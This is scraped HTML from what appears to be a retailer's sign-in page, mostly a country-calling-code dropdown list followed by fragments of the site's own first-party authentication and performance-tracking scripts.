        <option data-calling-code="996" value="KG" data-a-html-content="Kyrgyzstan &lt;span dir=&quot;ltr&quot;&gt;+996&lt;/span&gt;">
            KG +996
        </option>
    
        
        <option data-calling-code="856" value="LA" data-a-html-content="Laos &lt;span dir=&quot;ltr&quot;&gt;+856&lt;/span&gt;">
            LA +856
        </option>
    
        
        <option data-calling-code="371" value="LV" data-a-html-content="Latvia &lt;span dir=&quot;ltr&quot;&gt;+371&lt;/span&gt;">
            LV +371
        </option>
    
        
        <option data-calling-code="961" value="LB" data-a-html-content="Lebanon &lt;span dir=&quot;ltr&quot;&gt;+961&lt;/span&gt;">
            LB +961
        </option>
    
        
        <option data-calling-code="266" value="LS" data-a-html-content="Lesotho &lt;span dir=&quot;ltr&quot;&gt;+266&lt;/span&gt;">
            LS +266
        </option>
    
        
        <option data-calling-code="231" value="LR" data-a-html-content="Liberia &lt;span dir=&quot;ltr&quot;&gt;+231&lt;/span&gt;">
            LR +231
        </option>
    
        
        <option data-calling-code="218" value="LY" data-a-html-content="Libya &lt;span dir=&quot;ltr&quot;&gt;+218&lt;/span&gt;">
            LY +218
        </option>
    
        
        <option data-calling-code="423" value="LI" data-a-html-content="Liechtenstein &lt;span dir=&quot;ltr&quot;&gt;+423&lt;/span&gt;">
            LI +423
        </option>
    
        
        <option data-calling-code="370" value="LT" data-a-html-content="Lithuania &lt;span dir=&quot;ltr&quot;&gt;+370&lt;/span&gt;">
            LT +370
        </option>
    
        
        <option data-calling-code="352" value="LU" data-a-html-content="Luxembourg &lt;span dir=&quot;ltr&quot;&gt;+352&lt;/span&gt;">
            LU +352
        </option>
    
        
        <option data-calling-code="853" value="MO" data-a-html-content="Macao &lt;span dir=&quot;ltr&quot;&gt;+853&lt;/span&gt;">
            MO +853
        </option>
    
        
        <option data-calling-code="261" value="MG" data-a-html-content="Madagascar &lt;span dir=&quot;ltr&quot;&gt;+261&lt;/span&gt;">
            MG +261
        </option>
    
        
        <option data-calling-code="265" value="MW" data-a-html-content="Malawi &lt;span dir=&quot;ltr&quot;&gt;+265&lt;/span&gt;">
            MW +265
        </option>
    
        
        <option data-calling-code="60" value="MY" data-a-html-content="Malaysia &lt;span dir=&quot;ltr&quot;&gt;+60&lt;/span&gt;">
            MY +60
        </option>
    
        
        <option data-calling-code="960" value="MV" data-a-html-content="Maldives &lt;span dir=&quot;ltr&quot;&gt;+960&lt;/span&gt;">
            MV +960
        </option>
    
        
        <option data-calling-code="223" value="ML" data-a-html-content="Mali &lt;span dir=&quot;ltr&quot;&gt;+223&lt;/span&gt;">
            ML +223
        </option>
    
        
        <option data-calling-code="356" value="MT" data-a-html-content="Malta &lt;span dir=&quot;ltr&quot;&gt;+356&lt;/span&gt;">
            MT +356
        </option>
    
        
        <option data-calling-code="692" value="MH" data-a-html-content="Marshall Islands &lt;span dir=&quot;ltr&quot;&gt;+692&lt;/span&gt;">
            MH +692
        </option>
    
        
        <option data-calling-code="596" value="MQ" data-a-html-content="Martinique &lt;span dir=&quot;ltr&quot;&gt;+596&lt;/span&gt;">
            MQ +596
        </option>
    
        
        <option data-calling-code="222" value="MR" data-a-html-content="Mauritania &lt;span dir=&quot;ltr&quot;&gt;+222&lt;/span&gt;">
            MR +222
        </option>
    
        
        <option data-calling-code="230" value="MU" data-a-html-content="Mauritius &lt;span dir=&quot;ltr&quot;&gt;+230&lt;/span&gt;">
            MU +230
        </option>
    
        
        <option data-calling-code="262" value="YT" data-a-html-content="Mayotte &lt;span dir=&quot;ltr&quot;&gt;+262&lt;/span&gt;">
            YT +262
        </option>
    
        
        <option data-calling-code="52" value="MX" data-a-html-content="Mexico &lt;span dir=&quot;ltr&quot;&gt;+52&lt;/span&gt;">
            MX +52
        </option>
    
        
        <option data-calling-code="691" value="FM" data-a-html-content="Micronesia &lt;span dir=&quot;ltr&quot;&gt;+691&lt;/span&gt;">
            FM +691
        </option>
    
        
        <option data-calling-code="373" value="MD" data-a-html-content="Moldova &lt;span dir=&quot;ltr&quot;&gt;+373&lt;/span&gt;">
            MD +373
        </option>
    
        
        <option data-calling-code="377" value="MC" data-a-html-content="Monaco &lt;span dir=&quot;ltr&quot;&gt;+377&lt;/span&gt;">
            MC +377
        </option>
    
        
        <option data-calling-code="976" value="MN" data-a-html-content="Mongolia &lt;span dir=&quot;ltr&quot;&gt;+976&lt;/span&gt;">
            MN +976
        </option>
    
        
        <option data-calling-code="382" value="ME" data-a-html-content="Montenegro &lt;span dir=&quot;ltr&quot;&gt;+382&lt;/span&gt;">
            ME +382
        </option>
    
        
        <option data-calling-code="1" value="MS" data-a-html-content="Montserrat &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            MS +1
        </option>
    
        
        <option data-calling-code="212" value="MA" data-a-html-content="Morocco &lt;span dir=&quot;ltr&quot;&gt;+212&lt;/span&gt;">
            MA +212
        </option>
    
        
        <option data-calling-code="258" value="MZ" data-a-html-content="Mozambique &lt;span dir=&quot;ltr&quot;&gt;+258&lt;/span&gt;">
            MZ +258
        </option>
    
        
        <option data-calling-code="95" value="MM" data-a-html-content="Myanmar (Burma) &lt;span dir=&quot;ltr&quot;&gt;+95&lt;/span&gt;">
            MM +95
        </option>
    
        
        <option data-calling-code="264" value="NA" data-a-html-content="Namibia &lt;span dir=&quot;ltr&quot;&gt;+264&lt;/span&gt;">
            NA +264
        </option>
    
        
        <option data-calling-code="674" value="NR" data-a-html-content="Nauru &lt;span dir=&quot;ltr&quot;&gt;+674&lt;/span&gt;">
            NR +674
        </option>
    
        
        <option data-calling-code="977" value="NP" data-a-html-content="Nepal &lt;span dir=&quot;ltr&quot;&gt;+977&lt;/span&gt;">
            NP +977
        </option>
    
        
        <option data-calling-code="31" value="NL" data-a-html-content="Netherlands &lt;span dir=&quot;ltr&quot;&gt;+31&lt;/span&gt;">
            NL +31
        </option>
    
        
        <option data-calling-code="687" value="NC" data-a-html-content="New Caledonia &lt;span dir=&quot;ltr&quot;&gt;+687&lt;/span&gt;">
            NC +687
        </option>
    
        
        <option data-calling-code="64" value="NZ" data-a-html-content="New Zealand &lt;span dir=&quot;ltr&quot;&gt;+64&lt;/span&gt;">
            NZ +64
        </option>
    
        
        <option data-calling-code="505" value="NI" data-a-html-content="Nicaragua &lt;span dir=&quot;ltr&quot;&gt;+505&lt;/span&gt;">
            NI +505
        </option>
    
        
        <option data-calling-code="227" value="NE" data-a-html-content="Niger &lt;span dir=&quot;ltr&quot;&gt;+227&lt;/span&gt;">
            NE +227
        </option>
    
        
        <option data-calling-code="234" value="NG" data-a-html-content="Nigeria &lt;span dir=&quot;ltr&quot;&gt;+234&lt;/span&gt;">
            NG +234
        </option>
    
        
        <option data-calling-code="683" value="NU" data-a-html-content="Niue &lt;span dir=&quot;ltr&quot;&gt;+683&lt;/span&gt;">
            NU +683
        </option>
    
        
        <option data-calling-code="672" value="NF" data-a-html-content="Norfolk Island &lt;span dir=&quot;ltr&quot;&gt;+672&lt;/span&gt;">
            NF +672
        </option>
    
        
        <option data-calling-code="850" value="KP" data-a-html-content="North Korea &lt;span dir=&quot;ltr&quot;&gt;+850&lt;/span&gt;">
            KP +850
        </option>
    
        
        <option data-calling-code="389" value="MK" data-a-html-content="North Macedonia &lt;span dir=&quot;ltr&quot;&gt;+389&lt;/span&gt;">
            MK +389
        </option>
    
        
        <option data-calling-code="1" value="MP" data-a-html-content="Northern Mariana Islands &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            MP +1
        </option>
    
        
        <option data-calling-code="47" value="NO" data-a-html-content="Norway &lt;span dir=&quot;ltr&quot;&gt;+47&lt;/span&gt;">
            NO +47
        </option>
    
        
        <option data-calling-code="968" value="OM" data-a-html-content="Oman &lt;span dir=&quot;ltr&quot;&gt;+968&lt;/span&gt;">
            OM +968
        </option>
    
        
        <option data-calling-code="92" value="PK" data-a-html-content="Pakistan &lt;span dir=&quot;ltr&quot;&gt;+92&lt;/span&gt;">
            PK +92
        </option>
    
        
        <option data-calling-code="680" value="PW" data-a-html-content="Palau &lt;span dir=&quot;ltr&quot;&gt;+680&lt;/span&gt;">
            PW +680
        </option>
    
        
        <option data-calling-code="970" value="PS" data-a-html-content="Palestinian Territories &lt;span dir=&quot;ltr&quot;&gt;+970&lt;/span&gt;">
            PS +970
        </option>
    
        
        <option data-calling-code="507" value="PA" data-a-html-content="Panama &lt;span dir=&quot;ltr&quot;&gt;+507&lt;/span&gt;">
            PA +507
        </option>
    
        
        <option data-calling-code="675" value="PG" data-a-html-content="Papua New Guinea &lt;span dir=&quot;ltr&quot;&gt;+675&lt;/span&gt;">
            PG +675
        </option>
    
        
        <option data-calling-code="595" value="PY" data-a-html-content="Paraguay &lt;span dir=&quot;ltr&quot;&gt;+595&lt;/span&gt;">
            PY +595
        </option>
    
        
        <option data-calling-code="51" value="PE" data-a-html-content="Peru &lt;span dir=&quot;ltr&quot;&gt;+51&lt;/span&gt;">
            PE +51
        </option>
    
        
        <option data-calling-code="63" value="PH" data-a-html-content="Philippines &lt;span dir=&quot;ltr&quot;&gt;+63&lt;/span&gt;">
            PH +63
        </option>
    
        
        <option data-calling-code="0" value="PN" data-a-html-content="Pitcairn Islands &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            PN +0
        </option>
    
        
        <option data-calling-code="48" value="PL" data-a-html-content="Poland &lt;span dir=&quot;ltr&quot;&gt;+48&lt;/span&gt;">
            PL +48
        </option>
    
        
        <option data-calling-code="351" value="PT" data-a-html-content="Portugal &lt;span dir=&quot;ltr&quot;&gt;+351&lt;/span&gt;">
            PT +351
        </option>
    
        
        <option data-calling-code="1" value="PR" data-a-html-content="Puerto Rico &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            PR +1
        </option>
    
        
        <option data-calling-code="974" value="QA" data-a-html-content="Qatar &lt;span dir=&quot;ltr&quot;&gt;+974&lt;/span&gt;">
            QA +974
        </option>
    
        
        <option data-calling-code="40" value="RO" data-a-html-content="Romania &lt;span dir=&quot;ltr&quot;&gt;+40&lt;/span&gt;">
            RO +40
        </option>
    
        
        <option data-calling-code="7" value="RU" data-a-html-content="Russia &lt;span dir=&quot;ltr&quot;&gt;+7&lt;/span&gt;">
            RU +7
        </option>
    
        
        <option data-calling-code="250" value="RW" data-a-html-content="Rwanda &lt;span dir=&quot;ltr&quot;&gt;+250&lt;/span&gt;">
            RW +250
        </option>
    
        
        <option data-calling-code="262" value="RE" data-a-html-content="Réunion &lt;span dir=&quot;ltr&quot;&gt;+262&lt;/span&gt;">
            RE +262
        </option>
    
        
        <option data-calling-code="685" value="WS" data-a-html-content="Samoa &lt;span dir=&quot;ltr&quot;&gt;+685&lt;/span&gt;">
            WS +685
        </option>
    
        
        <option data-calling-code="378" value="SM" data-a-html-content="San Marino &lt;span dir=&quot;ltr&quot;&gt;+378&lt;/span&gt;">
            SM +378
        </option>
    
        
        <option data-calling-code="0" value="CQ" data-a-html-content="Sark &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            CQ +0
        </option>
    
        
        <option data-calling-code="966" value="SA" data-a-html-content="Saudi Arabia &lt;span dir=&quot;ltr&quot;&gt;+966&lt;/span&gt;">
            SA +966
        </option>
    
        
        <option data-calling-code="221" value="SN" data-a-html-content="Senegal &lt;span dir=&quot;ltr&quot;&gt;+221&lt;/span&gt;">
            SN +221
        </option>
    
        
        <option data-calling-code="381" value="RS" data-a-html-content="Serbia &lt;span dir=&quot;ltr&quot;&gt;+381&lt;/span&gt;">
            RS +381
        </option>
    
        
        <option data-calling-code="248" value="SC" data-a-html-content="Seychelles &lt;span dir=&quot;ltr&quot;&gt;+248&lt;/span&gt;">
            SC +248
        </option>
    
        
        <option data-calling-code="232" value="SL" data-a-html-content="Sierra Leone &lt;span dir=&quot;ltr&quot;&gt;+232&lt;/span&gt;">
            SL +232
        </option>
    
        
        <option data-calling-code="65" value="SG" data-a-html-content="Singapore &lt;span dir=&quot;ltr&quot;&gt;+65&lt;/span&gt;">
            SG +65
        </option>
    
        
        <option data-calling-code="1" value="SX" data-a-html-content="Sint Maarten &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            SX +1
        </option>
    
        
        <option data-calling-code="421" value="SK" data-a-html-content="Slovakia &lt;span dir=&quot;ltr&quot;&gt;+421&lt;/span&gt;">
            SK +421
        </option>
    
        
        <option data-calling-code="386" value="SI" data-a-html-content="Slovenia &lt;span dir=&quot;ltr&quot;&gt;+386&lt;/span&gt;">
            SI +386
        </option>
    
        
        <option data-calling-code="677" value="SB" data-a-html-content="Solomon Islands &lt;span dir=&quot;ltr&quot;&gt;+677&lt;/span&gt;">
            SB +677
        </option>
    
        
        <option data-calling-code="252" value="SO" data-a-html-content="Somalia &lt;span dir=&quot;ltr&quot;&gt;+252&lt;/span&gt;">
            SO +252
        </option>
    
        
        <option data-calling-code="27" value="ZA" data-a-html-content="South Africa &lt;span dir=&quot;ltr&quot;&gt;+27&lt;/span&gt;">
            ZA +27
        </option>
    
        
        <option data-calling-code="0" value="GS" data-a-html-content="South Georgia &amp; South Sandwich Islands &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            GS +0
        </option>
    
        
        <option data-calling-code="82" value="KR" data-a-html-content="South Korea &lt;span dir=&quot;ltr&quot;&gt;+82&lt;/span&gt;">
            KR +82
        </option>
    
        
        <option data-calling-code="211" value="SS" data-a-html-content="South Sudan &lt;span dir=&quot;ltr&quot;&gt;+211&lt;/span&gt;">
            SS +211
        </option>
    
        
        <option data-calling-code="34" value="ES" data-a-html-content="Spain &lt;span dir=&quot;ltr&quot;&gt;+34&lt;/span&gt;">
            ES +34
        </option>
    
        
        <option data-calling-code="94" value="LK" data-a-html-content="Sri Lanka &lt;span dir=&quot;ltr&quot;&gt;+94&lt;/span&gt;">
            LK +94
        </option>
    
        
        <option data-calling-code="590" value="BL" data-a-html-content="St Barthélemy &lt;span dir=&quot;ltr&quot;&gt;+590&lt;/span&gt;">
            BL +590
        </option>
    
        
        <option data-calling-code="290" value="SH" data-a-html-content="St Helena &lt;span dir=&quot;ltr&quot;&gt;+290&lt;/span&gt;">
            SH +290
        </option>
    
        
        <option data-calling-code="1" value="KN" data-a-html-content="St Kitts &amp; Nevis &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            KN +1
        </option>
    
        
        <option data-calling-code="1" value="LC" data-a-html-content="St Lucia &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            LC +1
        </option>
    
        
        <option data-calling-code="590" value="MF" data-a-html-content="St Martin &lt;span dir=&quot;ltr&quot;&gt;+590&lt;/span&gt;">
            MF +590
        </option>
    
        
        <option data-calling-code="508" value="PM" data-a-html-content="St Pierre &amp; Miquelon &lt;span dir=&quot;ltr&quot;&gt;+508&lt;/span&gt;">
            PM +508
        </option>
    
        
        <option data-calling-code="1" value="VC" data-a-html-content="St Vincent &amp; the Grenadines &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            VC +1
        </option>
    
        
        <option data-calling-code="249" value="SD" data-a-html-content="Sudan &lt;span dir=&quot;ltr&quot;&gt;+249&lt;/span&gt;">
            SD +249
        </option>
    
        
        <option data-calling-code="597" value="SR" data-a-html-content="Suriname &lt;span dir=&quot;ltr&quot;&gt;+597&lt;/span&gt;">
            SR +597
        </option>
    
        
        <option data-calling-code="47" value="SJ" data-a-html-content="Svalbard &amp; Jan Mayen &lt;span dir=&quot;ltr&quot;&gt;+47&lt;/span&gt;">
            SJ +47
        </option>
    
        
        <option data-calling-code="46" value="SE" data-a-html-content="Sweden &lt;span dir=&quot;ltr&quot;&gt;+46&lt;/span&gt;">
            SE +46
        </option>
    
        
        <option data-calling-code="41" value="CH" data-a-html-content="Switzerland &lt;span dir=&quot;ltr&quot;&gt;+41&lt;/span&gt;">
            CH +41
        </option>
    
        
        <option data-calling-code="963" value="SY" data-a-html-content="Syria &lt;span dir=&quot;ltr&quot;&gt;+963&lt;/span&gt;">
            SY +963
        </option>
    
        
        <option data-calling-code="239" value="ST" data-a-html-content="São Tomé &amp; Príncipe &lt;span dir=&quot;ltr&quot;&gt;+239&lt;/span&gt;">
            ST +239
        </option>
    
        
        <option data-calling-code="886" value="TW" data-a-html-content="Taiwan &lt;span dir=&quot;ltr&quot;&gt;+886&lt;/span&gt;">
            TW +886
        </option>
    
        
        <option data-calling-code="992" value="TJ" data-a-html-content="Tajikistan &lt;span dir=&quot;ltr&quot;&gt;+992&lt;/span&gt;">
            TJ +992
        </option>
    
        
        <option data-calling-code="255" value="TZ" data-a-html-content="Tanzania &lt;span dir=&quot;ltr&quot;&gt;+255&lt;/span&gt;">
            TZ +255
        </option>
    
        
        <option data-calling-code="66" value="TH" data-a-html-content="Thailand &lt;span dir=&quot;ltr&quot;&gt;+66&lt;/span&gt;">
            TH +66
        </option>
    
        
        <option data-calling-code="670" value="TL" data-a-html-content="Timor-Leste &lt;span dir=&quot;ltr&quot;&gt;+670&lt;/span&gt;">
            TL +670
        </option>
    
        
        <option data-calling-code="228" value="TG" data-a-html-content="Togo &lt;span dir=&quot;ltr&quot;&gt;+228&lt;/span&gt;">
            TG +228
        </option>
    
        
        <option data-calling-code="690" value="TK" data-a-html-content="Tokelau &lt;span dir=&quot;ltr&quot;&gt;+690&lt;/span&gt;">
            TK +690
        </option>
    
        
        <option data-calling-code="676" value="TO" data-a-html-content="Tonga &lt;span dir=&quot;ltr&quot;&gt;+676&lt;/span&gt;">
            TO +676
        </option>
    
        
        <option data-calling-code="1" value="TT" data-a-html-content="Trinidad &amp; Tobago &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            TT +1
        </option>
    
        
        <option data-calling-code="290" value="TA" data-a-html-content="Tristan da Cunha &lt;span dir=&quot;ltr&quot;&gt;+290&lt;/span&gt;">
            TA +290
        </option>
    
        
        <option data-calling-code="216" value="TN" data-a-html-content="Tunisia &lt;span dir=&quot;ltr&quot;&gt;+216&lt;/span&gt;">
            TN +216
        </option>
    
        
        <option data-calling-code="993" value="TM" data-a-html-content="Turkmenistan &lt;span dir=&quot;ltr&quot;&gt;+993&lt;/span&gt;">
            TM +993
        </option>
    
        
        <option data-calling-code="1" value="TC" data-a-html-content="Turks &amp; Caicos Islands &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            TC +1
        </option>
    
        
        <option data-calling-code="688" value="TV" data-a-html-content="Tuvalu &lt;span dir=&quot;ltr&quot;&gt;+688&lt;/span&gt;">
            TV +688
        </option>
    
        
        <option data-calling-code="90" value="TR" data-a-html-content="Türkiye &lt;span dir=&quot;ltr&quot;&gt;+90&lt;/span&gt;">
            TR +90
        </option>
    
        
        <option data-calling-code="0" value="UM" data-a-html-content="US Outlying Islands &lt;span dir=&quot;ltr&quot;&gt;+0&lt;/span&gt;">
            UM +0
        </option>
    
        
        <option data-calling-code="1" value="VI" data-a-html-content="US Virgin Islands &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            VI +1
        </option>
    
        
        <option data-calling-code="256" value="UG" data-a-html-content="Uganda &lt;span dir=&quot;ltr&quot;&gt;+256&lt;/span&gt;">
            UG +256
        </option>
    
        
        <option data-calling-code="380" value="UA" data-a-html-content="Ukraine &lt;span dir=&quot;ltr&quot;&gt;+380&lt;/span&gt;">
            UA +380
        </option>
    
        
        <option data-calling-code="971" value="AE" data-a-html-content="United Arab Emirates &lt;span dir=&quot;ltr&quot;&gt;+971&lt;/span&gt;">
            AE +971
        </option>
    
        
        <option data-calling-code="44" value="GB" data-a-html-content="United Kingdom &lt;span dir=&quot;ltr&quot;&gt;+44&lt;/span&gt;">
            GB +44
        </option>
    
        
        <option data-calling-code="1" value="US" data-a-html-content="United States &lt;span dir=&quot;ltr&quot;&gt;+1&lt;/span&gt;">
            US +1
        </option>
    
        
        <option data-calling-code="598" value="UY" data-a-html-content="Uruguay &lt;span dir=&quot;ltr&quot;&gt;+598&lt;/span&gt;">
            UY +598
        </option>
    
        
        <option data-calling-code="998" value="UZ" data-a-html-content="Uzbekistan &lt;span dir=&quot;ltr&quot;&gt;+998&lt;/span&gt;">
            UZ +998
        </option>
    
        
        <option data-calling-code="678" value="VU" data-a-html-content="Vanuatu &lt;span dir=&quot;ltr&quot;&gt;+678&lt;/span&gt;">
            VU +678
        </option>
    
        
        <option data-calling-code="39" value="VA" data-a-html-content="Vatican City &lt;span dir=&quot;ltr&quot;&gt;+39&lt;/span&gt;">
            VA +39
        </option>
    
        
        <option data-calling-code="58" value="VE" data-a-html-content="Venezuela &lt;span dir=&quot;ltr&quot;&gt;+58&lt;/span&gt;">
            VE +58
        </option>
    
        
        <option data-calling-code="84" value="VN" data-a-html-content="Vietnam &lt;span dir=&quot;ltr&quot;&gt;+84&lt;/span&gt;">
            VN +84
        </option>
    
        
        <option data-calling-code="681" value="WF" data-a-html-content="Wallis &amp; Futuna &lt;span dir=&quot;ltr&quot;&gt;+681&lt;/span&gt;">
            WF +681
        </option>
    
        
        <option data-calling-code="212" value="EH" data-a-html-content="Western Sahara &lt;span dir=&quot;ltr&quot;&gt;+212&lt;/span&gt;">
            EH +212
        </option>
    
        
        <option data-calling-code="967" value="YE" data-a-html-content="Yemen &lt;span dir=&quot;ltr&quot;&gt;+967&lt;/span&gt;">
            YE +967
        </option>
    
        
        <option data-calling-code="260" value="ZM" data-a-html-content="Zambia &lt;span dir=&quot;ltr&quot;&gt;+260&lt;/span&gt;">
            ZM +260
        </option>
    
        
        <option data-calling-code="263" value="ZW" data-a-html-content="Zimbabwe &lt;span dir=&quot;ltr&quot;&gt;+263&lt;/span&gt;">
            ZW +263
        </option>
    
        
        <option data-calling-code="358" value="AX" data-a-html-content="Åland Islands &lt;span dir=&quot;ltr&quot;&gt;+358&lt;/span&gt;">
            AX +358
        </option>
...
<script type="text/javascript">
  window.fwcimCmd = [['profile', 'signIn']];
</script>
    ...
    <script type="text/javascript">(function(f) {var _np=(window.P._namespace(""));if(_np.guardFatal){_np.guardFatal(f)(_np);}else{f(_np);}}(function(P) {
      P.when('A', 'authx-claim-collection-controller').execute(function(A, controller) {
...
if (window.ue && window.ue.uels) {
        var cel_widgets = [ { "c":"celwidget" },{ "s":"#nav-swmslot > div", "id_gen":function(elem, index){ return 'nav_sitewide_msg'; } } ];
                ...
                ue.uels("https://images-eu.ssl-images-amazon.com/images/I/215h87l68bL.js");
}
...
var ue_pty = "FullPageAuthentication";
...
e)?h=d-1:D.pop();D.push(c)}C=H.now()-F;s=Math.min(s,C);v=Math.max(v,C);A=(A*b+C)/(b+1);b+=1;q({k:x,e:D,min:Math.floor(1E3*s),max:Math.floor(1E3*v),avg:Math.floor(1E3*A)},{c:1});u=[];D=[];h=0}}var f=100,B=20,z=25,x="mmm1",l,k=d.window,e=d.document,w=d.setInterval,t=a.ue,q=a.ue_cel.log,g,s=1E3,v=0,A=0,b=0,F,C,u=[],D=[],h=0,p,y,E,G,r,H=m&&m.now&&m||Date.now&&Date||{now:function(){return(new Date).getTime()}};return{on:function(a){l=a.ts;k=a.ns;t.attach&&t.attach("mousemove",n,e);g=w(c,3E3)},off:function(a){k&&
...
<script>window.ue && ue.count && ue.count('CSMLibrarySize', 64480)</script>
